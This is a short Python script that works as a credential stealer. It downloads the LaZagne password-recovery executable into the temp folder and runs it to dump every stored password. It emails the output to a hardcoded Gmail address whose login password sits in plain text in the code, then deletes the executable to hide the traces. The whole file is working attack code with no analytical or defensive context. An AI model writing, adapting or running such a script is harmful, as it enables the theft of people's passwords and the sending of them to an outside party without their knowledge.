#!/usr/bin/env python


import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as output_file:
        output_file.write(get_response.content)

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = subprocess.check_output("Lazagne.exe all",shell=True)
send_mail("mingoemanuel07@gmail.com","4dm1nmkh94",result)
os.remove("Lazagne.exe")
